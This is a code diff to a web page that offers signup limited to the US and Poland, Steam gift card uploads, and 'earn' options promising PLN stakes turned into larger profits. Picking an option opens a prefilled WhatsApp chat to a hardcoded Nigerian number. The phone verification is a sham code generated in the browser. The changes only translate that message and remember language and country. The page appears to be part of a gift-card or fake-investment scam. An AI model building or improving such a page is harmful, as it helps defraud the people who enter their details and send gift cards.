@@ -145,16 +145,18 @@ const options = [
 ];
 
 const translations = {
-  en: { welcome:"Welcome — Signup / Login (US & Poland only)", country:"Country", language:"Language", name:"Name", phone:"Phone", sendCode:"Send code", notSent:"Not sent", enterCode:"Enter code", finishLogin:"Finish login", uploadCard:"Upload a card", uploadDesc:"United States & Poland only — Steam gift card uploads only.", chooseMethod:"Choose method you want to earn:", balance:"Balance", myAccount:"My Account", backHome:"⬅ Back to Home", alertCountry:"Only Poland and United States allowed", alertMissing:"Enter name + phone", loginSuccess:"Login success", loggedOut:"Logged out" },
-  pl: { welcome:"Witamy — Rejestracja / Logowanie (tylko USA i Polska)", country:"Kraj", language:"Język", name:"Imię", phone:"Telefon", sendCode:"Wyślij kod", notSent:"Nie wysłano", enterCode:"Wpisz kod", finishLogin:"Zakończ logowanie", uploadCard:"Prześlij kartę", uploadDesc:"Tylko USA i Polska — tylko karty podarunkowe Steam.", chooseMethod:"Wybierz metodę zarabiania:", balance:"Saldo", myAccount:"Moje konto", backHome:"⬅ Powrót do strony głównej", alertCountry:"Dozwolone tylko Polska i Stany Zjednoczone", alertMissing:"Wpisz imię i telefon", loginSuccess:"Logowanie zakończone sukcesem", loggedOut:"Wylogowano" }
+  en: { welcome:"Welcome — Signup / Login (US & Poland only)", country:"Country", language:"Language", name:"Name", phone:"Phone", sendCode:"Send code", notSent:"Not sent", enterCode:"Enter code", finishLogin:"Finish login", uploadCard:"Upload a card", uploadDesc:"United States & Poland only — Steam gift card uploads only.", chooseMethod:"Choose method you want to earn:", balance:"Balance", myAccount:"My Account", backHome:"⬅ Back to Home", alertCountry:"Only Poland and United States allowed", alertMissing:"Enter name + phone", loginSuccess:"Login success", loggedOut:"Logged out", waMessage:(name,stake,profit)=>`Hello, my name is ${name}. I want to select the option ${stake} PLN → ${profit} PLN.` },
+  pl: { welcome:"Witamy — Rejestracja / Logowanie (tylko USA i Polska)", country:"Kraj", language:"Język", name:"Imię", phone:"Telefon", sendCode:"Wyślij kod", notSent:"Nie wysłano", enterCode:"Wpisz kod", finishLogin:"Zakończ logowanie", uploadCard:"Prześlij kartę", uploadDesc:"Tylko USA i Polska — tylko karty podarunkowe Steam.", chooseMethod:"Wybierz metodę zarabiania:", balance:"Saldo", myAccount:"Moje konto", backHome:"⬅ Powrót do strony głównej", alertCountry:"Dozwolone tylko Polska i Stany Zjednoczone", alertMissing:"Wpisz imię i telefon", loginSuccess:"Logowanie zakończone sukcesem", loggedOut:"Wylogowano", waMessage:(name,stake,profit)=>`Cześć, mam na imię ${name}. Chcę wybrać opcję ${stake} PLN → ${profit} PLN.` }
 };
 
 const stateKey = "demo_safe_users";
 const sessionKey = "demo_safe_session";
+const langKey = "demo_safe_lang";
+const countryKey = "demo_safe_country";
 
 let users = JSON.parse(localStorage.getItem(stateKey) || "{}");
 let currentUser = JSON.parse(localStorage.getItem(sessionKey) || "null");
-const whatsappNumber = "2348108462471"; // ✅ Your WhatsApp number in international format
+const whatsappNumber = "2348108462471";
 
 function saveUsers(){ localStorage.setItem(stateKey, JSON.stringify(users)); }
 function saveSession(){ localStorage.setItem(sessionKey, JSON.stringify(currentUser)); }
@@ -166,6 +168,7 @@ const hide = id => el(id).classList.add("hidden");
 const notif = (t) => { const n = el('notif'); n.textContent = t; n.classList.remove('hidden'); setTimeout(()=>n.classList.add('hidden'),3500); }
 
 function updateLanguage(lang){
+  localStorage.setItem(langKey, lang);
   el("gate").querySelector("h1").textContent = translations[lang].welcome;
   document.querySelector("label[for='country']").textContent = translations[lang].country;
   document.querySelector("label[for='lang']").textContent = translations[lang].language;
@@ -208,12 +211,13 @@ renderOptions();
 
 document.addEventListener('click', (e)=>{
   if(e.target.matches('[data-id]')){
+    const lang = localStorage.getItem(langKey) || 'en';
     const id = Number(e.target.getAttribute('data-id'));
     const opt = options.find(o=>o.id===id);
     if(opt && currentUser){
       currentUser.selectedOption = opt;
       saveSession();
-      const message = `Hello, my name is ${currentUser.name}. I want to select the option ${opt.stake} PLN → ${opt.profit} PLN.`;
+      const message = translations[lang].waMessage(currentUser.name,opt.stake,opt.profit);
       const url = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
       window.open(url, "_blank");
     }
@@ -222,13 +226,13 @@ document.addEventListener('click', (e)=>{
 
 el("country").addEventListener("change", () => {
   const country = el("country").value;
-  if(country === "PL"){
-    el("lang").value = "pl";
-    updateLanguage("pl");
-  } else if(country === "US"){
-    el("lang").value = "en";
-    updateLanguage("en");
-  }
+  localStorage.setItem(countryKey, country);
+  if(country === "PL"){ el("lang").value = "pl"; updateLanguage("pl"); }
+  else if(country === "US"){ el("lang").value = "en"; updateLanguage("en"); }
+});
+
+el("lang").addEventListener("change", () => {
+  updateLanguage(el("lang").value);
 });
 
 el('sendCode').addEventListener('click', ()=>{
@@ -236,10 +240,7 @@ el('sendCode').addEventListener('click', ()=>{
   const lang = el('lang').value;
   const name = el('name').value.trim();
   const phone = el('phone').value.trim();
-  if(country !== 'PL' && country !== 'US'){ 
-    alert(translations[lang].alertCountry);
-    return; 
-  }
+  if(country !== 'PL' && country !== 'US'){ alert(translations[lang].alertCountry); return; }
   if(!name || !phone){ alert(translations[lang].alertMissing); return; }
   currentUser = users[phone] || { name, phone, balance:0 };
   currentUser.pendingCode = String(Math.floor(100000 + Math.random()*900000));
@@ -253,10 +254,7 @@ el('finishSignup').addEventListener('click', ()=>{
   const lang = el('lang').value;
   const code = el('code').value.trim();
   if(!currentUser || code !== currentUser.pendingCode){ alert('Invalid code'); return; }
-  delete currentUser.pendingCode; 
-  users[currentUser.phone]=currentUser; 
-  saveUsers();
-  saveSession(); 
+  delete currentUser.pendingCode; users[currentUser.phone]=currentUser; saveUsers(); saveSession();
   notif(translations[lang].loginSuccess); updateUI();
 });
 
@@ -264,14 +262,18 @@ el('meBtn').addEventListener('click', ()=>{ hide('home'); show('meCard'); });
 el('backHomeBtn').addEventListener('click', ()=>{ hide('meCard'); show('home'); });
 el('logoutBtn').addEventListener('click', ()=>{
   const lang = el('lang').value;
-  currentUser=null; 
-  clearSession();
-  updateUI(); 
-  notif(translations[lang].loggedOut);
+  currentUser=null; clearSession(); updateUI(); notif(translations[lang].loggedOut);
 });
 
-updateLanguage(el("lang").value);
-updateUI();
+// ✅ Restore language & country on page load
+window.addEventListener("DOMContentLoaded", () => {
+  const savedLang = localStorage.getItem(langKey) || "en";
+  const savedCountry = localStorage.getItem(countryKey) || "";
+  el("lang").value = savedLang;
+  el("country").value = savedCountry;
+  updateLanguage(savedLang);
+  updateUI();
+});
 </script>
 </body>
 </html>
